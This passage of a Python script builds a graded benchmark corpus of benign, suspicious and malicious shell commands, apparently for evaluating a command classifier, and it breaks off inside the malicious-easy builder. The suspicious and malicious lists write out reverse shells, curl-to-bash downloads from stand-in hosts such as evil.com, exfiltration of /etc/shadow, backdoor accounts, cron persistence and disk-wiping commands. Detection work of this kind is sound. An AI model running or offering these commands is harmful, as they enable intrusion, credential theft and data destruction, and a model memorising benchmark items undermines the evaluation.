#!/usr/bin/env python3
"""Generate a graded 3-class benchmark corpus.

Output format:
    difficulty|label|command

The corpus contains 100 easy, 100 medium, and 100 hard commands for each of:
    - benign
    - suspicious
    - malicious

This file intentionally favors realistic operator/admin command patterns over
benchmark-fitted classifier heuristics.
"""

from __future__ import annotations

import argparse
from collections import Counter
from pathlib import Path


def push_unique(bucket: list[str], seen: set[str], commands: list[str] | tuple[str, ...]) -> None:
    for command in commands:
        normalized = " ".join(command.strip().split())
        if normalized in seen:
            continue
        seen.add(normalized)
        bucket.append(command.strip())


def finalize_bucket(bucket: list[str], expected: int, name: str) -> list[str]:
    if len(bucket) < expected:
        raise ValueError(f"{name} only generated {len(bucket)} commands, expected {expected}")
    return bucket[:expected]


def build_benign_easy() -> list[str]:
    bucket: list[str] = []
    seen: set[str] = set()

    push_unique(bucket, seen, [
        'pwd', 'whoami', 'id', 'hostname', 'uname -a', 'date', 'uptime',
        'df -h', 'free -m', 'lsblk', 'mount | grep ext4', 'ip addr show',
        'ip route', 'ss -tuln', 'netstat -rn', 'arp -a', 'route -n',
        'ps aux --sort=-%mem | head -10', 'top -bn1 | head -10',
        'find /tmp -type f -mtime -1 | head -20', 'du -sh /tmp',
        'ls -la /var/log', 'ls -la /etc', 'ls -la /home', 'ls -la /usr/bin | head',
        'cat /etc/hostname', 'cat /etc/os-release', 'cat /proc/cpuinfo | head -20',
        'cat /proc/meminfo | head -20', 'cat /proc/version', 'echo "hello world"',
        'printf "%s\\n" "healthcheck"', 'env | grep PATH', 'history | tail -20',
        'file /bin/ls', 'stat /etc/passwd', 'head -5 /etc/group', 'wc -l /etc/passwd',
        'journalctl -u sshd --no-pager -n 20', 'systemctl status nginx',
        'git log --oneline -5', 'docker ps', 'kubectl get pods -A',
        'pip list 2>/dev/null | head -20', 'dpkg -l | grep python',
        'tar tzf backup.tar.gz 2>/dev/null | head -10', 'md5sum /etc/passwd',
        'sha256sum /bin/bash', 'chmod 644 /tmp/report.txt', 'cp /tmp/report.csv /tmp/report.bak',
    ])

    dirs = ['/var/log', '/etc', '/tmp', '/opt', '/srv', '/usr/local/bin', '/home/dev', '/var/tmp']
    for directory in dirs:
        push_unique(bucket, seen, [
            f'ls -lah {directory}',
            f'find {directory} -maxdepth 1 -type f | head -20',
            f'du -sh {directory} 2>/dev/null',
        ])

    files = ['/etc/hosts', '/etc/resolv.conf', '/etc/fstab', '/proc/uptime', '/proc/loadavg', '/proc/partitions']
    for file_path in files:
        push_unique(bucket, seen, [
            f'head -20 {file_path}',
            f'stat {file_path}',
            f'wc -l {file_path}',
        ])

    services = ['nginx', 'sshd', 'docker', 'postgresql', 'cron', 'redis']
    for service in services:
        push_unique(bucket, seen, [
            f'systemctl is-active {service}',
            f'systemctl is-enabled {service}',
        ])

    tools = ['python3', 'curl', 'wget', 'git', 'tar', 'ssh', 'openssl', 'docker']
    for tool in tools:
        push_unique(bucket, seen, [
            f'which {tool}',
            f'command -v {tool}',
        ])

    return finalize_bucket(bucket, 100, 'benign_easy')


def build_benign_medium() -> list[str]:
    bucket: list[str] = []
    seen: set[str] = set()

    push_unique(bucket, seen, [
        'curl -fsS https://packages.ubuntu.com/ > /tmp/packages-index.html',
        'curl -fsS https://repo.company.local/app/releases/latest.tar.gz -o /tmp/app.tar.gz',
        'wget -q https://artifacts.company.local/agent/agent-1.2.3.rpm -O /tmp/agent.rpm',
        'sha256sum /tmp/app.tar.gz',
        'tar -xzf /tmp/app.tar.gz -C /tmp/app-release',
        'tar czf /var/backups/nginx-logs.tar.gz /var/log/nginx',
        'zip -r /tmp/config-backup.zip /etc/nginx /etc/systemd/system',
        'rsync -avz /var/log/nginx/ backup@10.0.0.20:/srv/backups/nginx-logs/',
        'scp /var/log/nginx/access.log backup@10.0.0.20:/srv/incident-logs/',
        'chmod 700 ~/.ssh',
        'chmod 755 /srv/app/current/bin/start.sh',
        'chown -R app:app /srv/app/current',
        'systemctl restart nginx',
        'systemctl reload nginx',
        'systemctl restart docker',
        'journalctl -u nginx --since "1 hour ago"',
        'docker logs --tail 200 web',
        'docker inspect web',
        'docker exec web /usr/bin/env',
        'kubectl logs deploy/web --tail=200',
        'kubectl describe pod web-0',
        'kubectl rollout status deploy/web',
        'kubectl cp web-0:/var/log/app.log ./app.log',
        'openssl s_client -connect internal-api.company.local:443 -servername internal-api.company.local </dev/null',
        'openssl x509 -in /etc/ssl/certs/company.pem -text -noout',
        'strace -p $(pgrep nginx) -e trace=network -o /tmp/nginx.trace',
        'ltrace -p $(pgrep postgres) -o /tmp/postgres.ltrace',
        'gdb -batch -p $(pgrep app-server) -ex "thread apply all bt"',
        'tcpdump -i eth0 -c 50 port 443',
        'python3 -m http.server 127.0.0.1 8080 --directory /srv/app/build',
    ])

    services = ['nginx', 'sshd', 'docker', 'postgresql', 'redis', 'cron', 'app']
    for service in services:
        push_unique(bucket, seen, [
            f'systemctl cat {service}',
            f'journalctl -u {service} --since today | tail -50',
        ])

    backup_pairs = [
        ('/etc/nginx', '/var/backups/nginx-config.tar.gz'),
        ('/srv/app/current', '/var/backups/app-current.tar.gz'),
        ('/home/dev/.config', '/var/backups/dev-config.tar.gz'),
        ('/etc/ssh', '/var/backups/ssh-config.tar.gz'),
        ('/var/log/app', '/var/backups/app-logs.tar.gz'),
    ]
    for source, archive in backup_pairs:
        push_unique(bucket, seen, [
            f'tar czf {archive} {source}',
            f'tar tzf {archive} | head -20',
        ])

    remote_hosts = ['backup@10.0.0.20', 'ops@10.0.0.30', 'deploy@192.168.1.20', 'audit@172.16.0.12']
    remote_sources = ['/var/log/nginx/', '/srv/app/releases/', '/etc/systemd/system/', '/home/dev/builds/']
    for host, source in zip(remote_hosts, remote_sources):
        push_unique(bucket, seen, [
            f'rsync -avz {source} {host}:/srv/snapshots/',
            f'scp {source.rstrip("/")}/README.md {host}:/srv/notes/',
        ])

    kubernetes_targets = ['deploy/web', 'deploy/api', 'statefulset/db', 'daemonset/log-agent']
    for target in kubernetes_targets:
        push_unique(bucket, seen, [
            f'kubectl rollout history {target}',
            f'kubectl logs {target} --tail=100',
        ])

    internal_downloads = [
        ('https://repo.company.local/cli/linux-amd64.tar.gz', '/tmp/cli.tar.gz'),
        ('https://mirror.internal/python-3.11.9.tgz', '/tmp/python.tgz'),
        ('https://artifacts.company.local/ops/tool.deb', '/tmp/tool.deb'),
        ('https://packages.redhat.com/repodata/repomd.xml', '/tmp/repomd.xml'),
        ('https://cdn.kernel.org/pub/linux/kernel/v6.x/sha256sums.asc', '/tmp/kernel-sums.asc'),
    ]
    for url, target in internal_downloads:
        push_unique(bucket, seen, [
            f'curl -fsSL {url} -o {target}',
            f'wget -q {url} -O {target}',
            f'file {target}',
            f'sha256sum {target}',
        ])

    admin_ops = [
        'systemctl daemon-reload', 'systemctl restart app', 'systemctl reload postgresql',
        'journalctl --disk-usage', 'docker stats --no-stream', 'docker exec web ls -la /app',
        'kubectl top pods -A', 'kubectl get events -A | tail -50',
        'openssl rsa -in /etc/ssl/private/server.key -check -noout',
        'tar czf /tmp/release-artifacts.tgz /srv/releases/current /etc/systemd/system/app.service',
        'rsync -avz /srv/releases/current/ deploy@10.0.0.40:/srv/release-mirror/',
        'scp /etc/nginx/nginx.conf ops@10.0.0.41:/srv/config-review/',
        'tcpdump -i eth0 -c 25 host 10.0.0.20 and port 5432',
        'python3 -m http.server 127.0.0.1 9090 --directory /tmp/release-notes',
    ]
    push_unique(bucket, seen, admin_ops)

    return finalize_bucket(bucket, 100, 'benign_medium')


def build_benign_hard() -> list[str]:
    bucket: list[str] = []
    seen: set[str] = set()

    push_unique(bucket, seen, [
        'ssh -L 8443:internal-api.company.local:443 bastion@10.0.0.10',
        'ssh -L 5432:db.internal:5432 dba@10.0.0.11',
        'ssh -D 1080 support@10.0.0.12',
        'scp /etc/ssl/certs/company.pem audit@10.0.0.50:/srv/cert-audit/',
        'rsync -avz /var/log/ auth@10.0.0.60:/srv/forensics/host-logs/',
        'tcpdump -i eth0 -c 100 host 10.0.0.20 and port 443 -w /tmp/tls-debug.pcap',
        'strace -f -p $(pgrep java) -e trace=network -o /tmp/java-net.trace',
        'gdb -batch -p $(pgrep redis-server) -ex "info threads" -ex "thread apply all bt"',
        'ltrace -p $(pgrep nginx) -o /tmp/nginx-debug.ltrace',
        'find /srv/app -name "*.pem" -type f',
        'find /etc -name "*.key" -type f',
        'find /home/dev -name "id_rsa" -type f',
        'tar czf /tmp/incident-artifacts.tar.gz /var/log/app /etc/nginx /srv/app/current/config',
        'openssl s_client -connect postgres.internal:5432 -starttls postgres </dev/null',
        'openssl s_client -connect smtp.internal:25 -starttls smtp </dev/null',
        'python3 -m http.server 0.0.0.0 9000 --directory /srv/releases/current',
        'socat TCP-LISTEN:9000,reuseaddr,fork FILE:/srv/releases/current/app.tar.gz,rdonly',
        'docker cp web:/var/log/app.log ./web-app.log',
        'kubectl exec deploy/web -- sh -c "tar cz /var/log/app" > /tmp/web-logs.tar.gz',
        'journalctl --since yesterday | grep -i ssl | tail -100',
    ])

    debug_targets = ['nginx', 'postgres', 'redis-server', 'dockerd', 'java', 'python3']
    for target in debug_targets:
        push_unique(bucket, seen, [
            f'strace -tt -p $(pgrep {target}) -o /tmp/{target}.strace',
            f'gdb -batch -p $(pgrep {target}) -ex "bt"',
        ])

    transfer_jobs = [
        ('/etc/ssh', 'audit@10.0.0.70:/srv/review/ssh/'),
        ('/srv/app/current/config', 'ops@10.0.0.80:/srv/review/config/'),
        ('/var/log/app', 'backup@10.0.0.90:/srv/incident/app-logs/'),
        ('/home/dev/.ssh', 'backup@10.0.0.91:/srv/incident/dev-ssh/'),
        ('/etc/systemd/system', 'ops@10.0.0.92:/srv/incident/systemd/'),
    ]
    for source, target in transfer_jobs:
        push_unique(bucket, seen, [
            f'rsync -avz {source} {target}',
            f'tar cz {source} | ssh {target.split(":", 1)[0]} "cat > /srv/staging/{Path(source).name}.tgz"',
        ])

    maintenance = [
        ('/srv/app/current', 'app:app'),
        ('/var/www/html', 'www-data:www-data'),
        ('/home/dev/.ssh', 'dev:dev'),
        ('/etc/nginx', 'root:root'),
        ('/srv/releases', 'deploy:deploy'),
    ]
    for path, owner in maintenance:
        push_unique(bucket, seen, [
            f'chown -R {owner} {path}',
            f'find {path} -type f -exec chmod 640 {{}} +',
        ])

    suspicious_but_legit = [
        'ssh -J bastion@10.0.0.10 dbadmin@10.0.0.15 "pg_dump --schema-only appdb" > /tmp/appdb-schema.sql',
        'scp ~/.ssh/known_hosts audit@10.0.0.55:/srv/ssh-baselines/',
        'rsync -avz /home/dev/.ssh/ backup@10.0.0.56:/srv/rotated-ssh-backups/',
        'tcpdump -i eth0 -G 60 -W 1 -w /tmp/one-minute.pcap port 443',
        'strace -ff -o /tmp/api.trace -p $(pgrep api-server)',
        'gdb -batch -p $(pgrep java) -ex "set pagination off" -ex "generate-core-file /tmp/java.core"',
        'find /etc -name "*.pem" -o -name "*.crt"',
        'find /srv -name ".env" -type f',
        'kubectl exec deploy/api -- sh -c "tar cz /etc/ssl /app/config" > /tmp/api-config.tgz',
        'docker exec db sh -c "tar cz /var/lib/postgresql/data/base" > /tmp/db-base.tgz',
        'openssl s_client -connect ldap.internal:636 -showcerts </dev/null',
        'python3 -m http.server 0.0.0.0 9443 --directory /srv/support-bundles',
        'socat TCP-LISTEN:9443,reuseaddr,fork FILE:/srv/support-bundles/current.tgz,rdonly',
        'ssh -R 9443:127.0.0.1:443 support@10.0.0.57',
        'ssh -D 9050 analyst@10.0.0.58',
        'rsync -avz /etc/kubernetes/ audit@10.0.0.59:/srv/k8s-audit/',
        'tar czf /tmp/root-ssh-audit.tgz /root/.ssh 2>/dev/null',
        'find /home -name "id_ed25519" -type f 2>/dev/null',
        'journalctl -u sshd --since yesterday > /tmp/sshd-yesterday.log',
        'curl -fsSL https://ifconfig.me -o /tmp/public-ip.txt',
    ]
    push_unique(bucket, seen, suspicious_but_legit)

    more_paths = ['/etc/ssl', '/srv/app/config', '/home/dev/.ssh', '/var/log/nginx', '/etc/kubernetes']
    for path in more_paths:
        push_unique(bucket, seen, [
            f'tar czf /tmp/{Path(path).name}-snapshot.tgz {path} 2>/dev/null',
            f'rsync -avz {path} audit@10.0.0.99:/srv/audit/{Path(path).name}/ 2>/dev/null',
            f'find {path} -maxdepth 2 -type f 2>/dev/null | head -50',
        ])

    remote_debug = ['10.0.0.61', '10.0.0.62', '10.0.0.63', '10.0.0.64', '10.0.0.65']
    for host in remote_debug:
        push_unique(bucket, seen, [
            f'ssh support@{host} "journalctl -u app --since today | tail -100"',
            f'ssh support@{host} "tar cz /var/log/app" > /tmp/{host}-app-logs.tgz',
            f'ssh support@{host} "find /etc -name \"*.pem\" -type f"',
        ])

    return finalize_bucket(bucket, 100, 'benign_hard')


def build_suspicious_easy() -> list[str]:
    bucket: list[str] = []
    seen: set[str] = set()

    push_unique(bucket, seen, [
        'cat /etc/passwd', 'cat /etc/group', 'cat /etc/crontab', 'cat /proc/self/maps',
        'cat /proc/net/tcp', 'cat /proc/net/udp', 'cat /proc/1/environ',
        'strings /proc/1/environ 2>/dev/null', 'env | grep -i secret', 'env | grep -i token',
        'env | grep -i key', 'grep -ri "password" /etc/ 2>/dev/null',
        'grep -ri "api_key" /home/ 2>/dev/null', 'grep -ri "token" /srv/ 2>/dev/null',
        'find / -name "*.pem" 2>/dev/null', 'find / -name "id_rsa" 2>/dev/null',
        'find / -writable -type d 2>/dev/null', 'find / -perm -4000 -type f 2>/dev/null',
        'ls -la /root', 'ls -la /etc/cron.d', 'last -20', 'lastlog', 'w', 'who',
        'sudo -l', 'ps auxww', 'ss -antp', 'netstat -tulpn', 'ip route',
        'iptables -L -n', 'systemctl list-units --type=service --state=running',
        'systemd-detect-virt', 'dmidecode -s system-manufacturer 2>/dev/null',
        'lsmod | grep -i vbox', 'aa-status', 'sestatus', 'getfacl /etc/shadow',
        'mount -o remount,rw /', 'python3 -m http.server 8080',
    ])

    grep_targets = [
        ('password', '/etc'), ('secret', '/etc'), ('token', '/etc'), ('apikey', '/srv'),
        ('private_key', '/home'), ('credential', '/opt'), ('passwd', '/var/www'), ('db_pass', '/srv/app'),
    ]
    for token, target in grep_targets:
        push_unique(bucket, seen, [
            f'grep -ri "{token}" {target} 2>/dev/null | head -20',
            f'find {target} -type f -name "*.conf" -exec grep -l "{token}" {{}} \; 2>/dev/null',
        ])

    sensitive_dirs = ['/root', '/root/.ssh', '/etc/ssh', '/etc/cron.d', '/dev/shm', '/var/spool/cron', '/home', '/srv']
    for directory in sensitive_dirs:
        push_unique(bucket, seen, [
            f'ls -la {directory} 2>/dev/null',
            f'find {directory} -maxdepth 2 -type f 2>/dev/null | head -20',
        ])

    proc_reads = ['/proc/version', '/proc/cpuinfo', '/proc/mounts', '/proc/net/route', '/proc/sys/kernel/randomize_va_space']
    for proc_file in proc_reads:
        push_unique(bucket, seen, [
            f'cat {proc_file}',
            f'stat {proc_file}',
        ])

    recon = [
        'getent passwd', 'getent group', 'getent shadow', 'ip neigh', 'ip link show',
        'find /home -name ".ssh" -type d 2>/dev/null', 'find /srv -name ".env" 2>/dev/null',
        'grep -ri "aws_secret" /home/ 2>/dev/null', 'grep -ri "BEGIN PRIVATE KEY" /etc/ 2>/dev/null',
        'ls -la /var/spool/cron 2>/dev/null', 'cat /etc/sudoers 2>/dev/null',
        'cat /root/.ssh/authorized_keys 2>/dev/null', 'docker ps -a', 'kubectl get secrets -A',
        'kubectl auth can-i --list', 'systemctl list-unit-files --state=enabled',
        'find / -name "*.ovpn" 2>/dev/null', 'find / -name "*.kubeconfig" 2>/dev/null',
        'find / -name "known_hosts" 2>/dev/null', 'grep -ri "passphrase" /home/ 2>/dev/null',
    ]
    push_unique(bucket, seen, recon)

    return finalize_bucket(bucket, 100, 'suspicious_easy')


def build_suspicious_medium() -> list[str]:
    bucket: list[str] = []
    seen: set[str] = set()

    push_unique(bucket, seen, [
        'curl -s http://192.168.1.100:8080/update.sh -o /tmp/update.sh',
        'wget -q http://10.0.0.5/tools/agent.bin -O /tmp/agent.bin',
        'nmap -sn 192.168.1.0/24', 'nmap -Pn 10.0.0.0/24', 'masscan 10.0.0.0/24 -p 22,80 --rate 1000',
        'tcpdump -i eth0 -w /tmp/capture.pcap', 'tcpdump -i any -c 200',
        'strace -p 1 -e trace=read', 'ltrace -p $(pgrep sshd) 2>/dev/null',
        'gdb -p $(pgrep apache2) --batch -ex "info proc mappings"',
        'curl -X POST http://10.0.0.5:9090/data -d @/etc/hostname',
        'tar czf /tmp/backup.tar.gz /home/user/.ssh/',
        'scp /etc/passwd user@10.0.0.5:/tmp/',
        'rsync -avz /var/log/ user@10.0.0.5:/tmp/logs/',
        'nc -lvnp 9999', 'ncat -l 4444', 'socat TCP-LISTEN:8080,fork -',
        'ssh -D 1080 -fNq user@10.0.0.1', 'chisel client 10.0.0.1:8080 R:1080:socks',
        'chmod 777 /tmp/script.sh', 'find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null',
    ])

    scan_targets = ['10.0.0.5', '10.0.0.10', '192.168.1.10', '172.16.0.15', 'db.internal']
    for target in scan_targets:
        push_unique(bucket, seen, [
            f'nmap -sV {target}',
            f'nmap -O {target}',
            f'nmap -p 22,80,443,445 {target}',
        ])

    listeners = [4444, 8080, 9000, 9443, 1080]
    for port in listeners:
        push_unique(bucket, seen, [
            f'python3 -m http.server {port}',
            f'nc -lvnp {port}',
            f'socat TCP-LISTEN:{port},fork -',
        ])

    exfil_sources = ['/etc/hostname', '/etc/os-release', '/var/log/auth.log', '/var/log/nginx/access.log', '/tmp/status.txt']
    for source in exfil_sources:
        push_unique(bucket, seen, [
            f'curl -X POST http://10.0.0.5:9090/upload -d @{source}',
            f'scp {source} audit@10.0.0.15:/tmp/',
        ])

    introspection = [
        'systemctl list-timers --all', 'ls -la /etc/systemd/system', 'find / -writable -type f 2>/dev/null',
        'find /var/www -name ".env" 2>/dev/null', 'find /home -name "authorized_keys" 2>/dev/null',
        'journalctl --since "2 hours ago" | grep -i fail', 'docker inspect $(docker ps -q | head -1)',
        'kubectl get secrets -A', 'kubectl auth can-i --list', 'crontab -l -u root',
    ]
    push_unique(bucket, seen, introspection)

    tunnels = ['10.0.0.1', '10.0.0.5', '192.168.1.20', '172.16.0.50', 'jump.internal']
    for target in tunnels:
        push_unique(bucket, seen, [
            f'ssh -D 1080 -fNq user@{target}',
            f'ssh -L 8443:127.0.0.1:443 user@{target}',
            f'chisel client {target}:8080 R:1080:socks',
        ])

    borderline = [
        'tar czf /tmp/kube-secrets.tgz /etc/kubernetes 2>/dev/null',
        'tar czf /tmp/root-home.tgz /root 2>/dev/null',
        'scp /etc/shadow audit@10.0.0.15:/tmp/ 2>/dev/null',
        'rsync -avz /root/.ssh/ audit@10.0.0.15:/tmp/root-ssh/ 2>/dev/null',
        'python3 -m http.server 0.0.0.0 9000 --directory /tmp',
        'socat TCP-LISTEN:9000,reuseaddr,fork FILE:/etc/hostname,rdonly',
        'tcpdump -i eth0 port 22 -w /tmp/ssh.pcap',
        'tshark -i eth0 -a duration:60 -w /tmp/minute.pcap',
        'curl -fsSL http://10.0.0.5:8080/diag.sh -o /tmp/diag.sh',
        'wget -q http://10.0.0.5:8000/audit.bin -O /tmp/audit.bin',
        'gdb -batch -p $(pgrep sshd) -ex "info proc mappings"',
        'strace -ff -p $(pgrep dockerd) -o /tmp/dockerd.trace',
        'kubectl exec deploy/api -- env | grep -i token',
        'docker exec web sh -c "cat /proc/1/environ"',
        'openssl s_client -connect 10.0.0.5:4444 -quiet',
        'find / -perm -2000 -type f 2>/dev/null',
        'find / -name "*.pcap" 2>/dev/null',
        'mount -o bind / /mnt 2>/dev/null',
        'chmod -R o+w /tmp/workdir',
        'journalctl --since today | grep -i sudo',
    ]
    push_unique(bucket, seen, borderline)

    return finalize_bucket(bucket, 100, 'suspicious_medium')


def build_suspicious_hard() -> list[str]:
    bucket: list[str] = []
    seen: set[str] = set()

    push_unique(bucket, seen, [
        'openssl s_client -quiet -connect 10.0.0.1:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445',
        'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444',
        'python3 -c "import pty; pty.spawn(\'/bin/bash\')"',
        'ruby -rsocket -e\'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        'xterm -display 10.0.0.1:1 -e /bin/bash',
        'find / -perm -4000 -type f 2>/dev/null',
        'tcpdump -i eth0 -w /tmp/capture.pcap',
        'ettercap -T -q -i eth0 -M arp:remote /10.0.0.1// /10.0.0.254//',
        'arpspoof -i eth0 -t 10.0.0.1 10.0.0.254',
        'responder -I eth0 -wrf',
        'mount -o remount,rw /', 'chmod 777 /tmp/script.sh',
        'chisel client 10.0.0.1:8080 R:8443:127.0.0.1:443',
        'ssh -R 8080:127.0.0.1:22 user@10.0.0.1',
        'ssh -L 8443:10.0.0.20:443 user@10.0.0.1',
        'tar cz /etc /var/log | curl -X PUT http://10.0.0.5:8080/upload --data-binary @-',
        'tar czf /tmp/home-ssh.tar.gz /home/*/.ssh 2>/dev/null',
        'kubectl exec deploy/web -- sh -c "env | grep -i token"',
        'docker exec web sh -c "cat /proc/1/environ"',
        'python3 -m http.server 0.0.0.0 8443 --directory /tmp',
    ])

    tunnel_targets = ['10.0.0.1', '10.0.0.5', '172.16.0.10', '192.168.1.50', 'jump.internal']
    for target in tunnel_targets:
        push_unique(bucket, seen, [
            f'ssh -D 1080 -fNq user@{target}',
            f'ssh -R 9050:127.0.0.1:22 user@{target}',
            f'chisel client {target}:8080 R:1080:socks',
        ])

    capture_jobs = [
        'tcpdump -i any -A | grep -i password',
        'tcpdump -i eth0 port 445 -w /tmp/smb.pcap',
        'tcpdump -i eth0 port 53 -w /tmp/dns.pcap',
        'tshark -i eth0 -w /tmp/all.pcap',
        'tcpdump -i eth0 host 10.0.0.20 -w /tmp/host20.pcap',
    ]
    push_unique(bucket, seen, capture_jobs)

    sensitive_staging = [
        '/etc/ssh', '/root/.ssh', '/home/dev/.ssh', '/var/lib/postgresql', '/srv/app/config',
        '/etc/kubernetes', '/var/lib/kubelet', '/etc/systemd/system', '/etc/pam.d', '/opt/secrets',
    ]
    for source in sensitive_staging:
        push_unique(bucket, seen, [
            f'tar czf /tmp/{Path(source).name}-stage.tgz {source} 2>/dev/null',
            f'rsync -avz {source} user@10.0.0.5:/tmp/stage/ 2>/dev/null',
        ])

    hard_dual_use = [
        'python3 -c "import http.server,socketserver;socketserver.TCPServer((\"0.0.0.0\",8088),http.server.SimpleHTTPRequestHandler).serve_forever()"',
        'php -S 0.0.0.0:8089 -t /tmp',
        'openssl enc -aes-256-cbc -salt -in /etc/hostname -out /tmp/hostname.enc -k secret',
        'tar cz /etc/ssh /root/.ssh 2>/dev/null | openssl enc -aes-256-cbc -k secret -out /tmp/ssh.enc',
        'curl -X PUT http://10.0.0.5:8080/collect --data-binary @/tmp/ssh.enc',
        'ssh -R 9000:127.0.0.1:22 support@10.0.0.1',
        'ssh -L 9443:10.0.0.20:443 support@10.0.0.1',
        'tcpdump -i eth0 -s 0 -w /tmp/full.pcap',
        'tshark -i eth0 -f "port 445" -w /tmp/smb.pcap',
        'gdb -batch -p $(pgrep postgres) -ex "generate-core-file /tmp/postgres.core"',
        'strace -ff -p $(pgrep sshd) -o /tmp/sshd.trace',
        'find /etc -name "*.key" -o -name "*.pem" 2>/dev/null',
        'kubectl cp kube-system/coredns-0:/etc/coredns/Corefile ./Corefile',
        'docker cp db:/var/lib/postgresql/data/pg_hba.conf ./pg_hba.conf',
        'mount -o remount,rw / && cp /bin/sh /tmp/.s && chmod 4755 /tmp/.s',
        'rsync -avz /etc/kubernetes/ user@10.0.0.5:/tmp/kube-stage/',
        'scp /root/.ssh/id_rsa user@10.0.0.5:/tmp/ 2>/dev/null',
        'find / -name "shadow" -o -name "passwd" 2>/dev/null | xargs -r ls -l',
        'tar czf /tmp/loot.tgz /etc /root /home 2>/dev/null',
        'curl -X POST http://10.0.0.5:9090/upload -d @/tmp/loot.tgz',
    ]
    push_unique(bucket, seen, hard_dual_use)

    lateral = ['10.0.0.21', '10.0.0.22', '10.0.0.23', '10.0.0.24', '10.0.0.25']
    for host in lateral:
        push_unique(bucket, seen, [
            f'ssh -R 9443:127.0.0.1:22 user@{host}',
            f'ssh -L 8080:{host}:80 user@10.0.0.1',
            f'nmap -sT -Pn {host}',
            f'curl -X POST http://10.0.0.5:8080/collect -d @/etc/hosts',
        ])

    push_unique(bucket, seen, [
        'curl -fsSL http://10.0.0.5:8080/stage.sh -o /tmp/stage.sh && chmod +x /tmp/stage.sh',
        'wget -q http://10.0.0.5:8000/toolkit.tgz -O /tmp/toolkit.tgz && tar xzf /tmp/toolkit.tgz -C /tmp/toolkit',
        'kubectl exec deploy/web -- sh -c "tar cz /var/run/secrets" > /tmp/pod-secrets.tgz',
        'docker exec web sh -c "find / -name *.pem 2>/dev/null"',
        'openssl s_client -connect 10.0.0.5:9443 -showcerts </dev/null',
        'socat TCP-LISTEN:9444,reuseaddr,fork FILE:/tmp/loot.tgz,rdonly',
        'ssh -D 9050 -fNq support@10.0.0.5',
        'find / -name ".env" -o -name "*.kubeconfig" 2>/dev/null | head -100',
    ])

    return finalize_bucket(bucket, 100, 'suspicious_hard')


def build_malicious_easy() -> list[str]:
    bucket: list[str] = []
    seen: set[str] = set()

    push_unique(bucket, seen, [
        'curl http://evil.com/shell.sh | bash',
        'wget -q http://malware.site/payload -O /tmp/.hidden && chmod +x /tmp/.hidden && /tmp/.hidden',
        'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
        'nc -e /bin/sh 10.0.0.1 4444',
        'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'10.0.0.1\',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"',
        'rm -rf / --no-preserve-root', ':(){ :|:& };:', 'dd if=/dev/zero of=/dev/sda bs=1M', 'mkfs.ext4 /dev/sda1',
        'cat /etc/shadow', 'unshadow /etc/passwd /etc/shadow > /tmp/crackme',
        'echo "attacker ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers',
        'useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor',
        'chmod u+s /bin/bash', 'cp /bin/bash /tmp/.backdoor && chmod u+s /tmp/.backdoor',
        'echo "* * * * * curl http://evil.com/mine | bash" | crontab -',
        'ssh-keygen -t rsa -N "" -f /tmp/key && cat /tmp/key.pub >> /root/.ssh/authorized_keys',
        'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA',
        'certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe',
        'bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\\temp\\payload.exe',
    ])

    domains = ['evil.com', 'malware.site', 'c2.bad', 'payload.red']
    targets = ['10.0.0.1', '10.0.0.5', '192.168.1.10', '172.16.0.15']
    ports = [4444, 5555, 8080, 9001]
    for domain in domains:
        push_unique(bucket, seen, [
            f'curl http://{domain}/a.sh | bash',
            f'wget -q http://{domain}/loader -O /tmp/loader && chmod +x /tmp/loader && /tmp/loader',
            f'echo "@reboot curl http://{domain}/boot.sh | bash" | crontab -',
        ])
    for target, port in zip(targets, ports):
        push_unique(bucket, seen, [
            f'bash -c "bash -i >& /dev/tcp/{target}/{port} 0>&1"',
            f'nc -e /bin/bash {target} {port}',
            f'php -r \"$s=fsockopen(\\\"{target}\\\",{port});exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");\"',
        ])

    destructive = [
        'shred -u /etc/passwd', 'wipefs -a /dev/sdb', 'rm -rf /var/log/*', 'truncate -s 0 /var/log/auth.log',
        'userdel -r admin', 'passwd -d root', 'pkill -9 sshd', 'kill -9 1',
        'curl -fsSL http://evil.com/dropper | sh', 'wget -qO- http://evil.com/bootstrap | bash',
        'chmod 4755 /tmp/rootsh', 'cp /bin/sh /tmp/rootsh && chmod 4755 /tmp/rootsh',
        'echo "root::0:0:root:/root:/bin/bash" >> /etc/passwd', 'echo "PermitRootLogin yes" >> /etc/ssh/sshd_config',
        'crontab -r', 'rm -f /etc/cron.d/*', 'echo "* * * * * /bin/bash -c \"nc -e /bin/sh 10.0.0.1 4444\"" | crontab -',
        'curl -X PUT http://10.0.0.5:8080/upload --data-binary @/etc/shadow',
        'scp /etc/shadow user@10.0.0.5:/tmp/', 'tar cz /etc/shadow /etc/passwd | nc 10.0.0.1 4444',
    ]
    push_unique(bucket, seen, destructive)

    more_easy = ['10.0.0.11', '10.0.0.12', '10.0.0.13', '10.0.0.14', '10.0.0.15']
    for host in more_easy:
        push_unique(bucket, seen, [
            f'curl http://{host}:8080/dropper.sh | bash',
            f'wget -q http://{host}:8000/agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent',
            f'bash -i >& /dev/tcp/{host}/4444 0>&1',
            f'nc -e /bin/sh {host} 5555',
            f'curl -X PUT http://{host}:9000/upload --data-binary @/etc/passwd',
            f'echo "@reboot nc -e /bin/sh {host} 4444" | crontab -',
            f'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD attacker@lab" >> /root/.ssh/authorized_keys',
        ])

    push_unique(bucket, seen, [
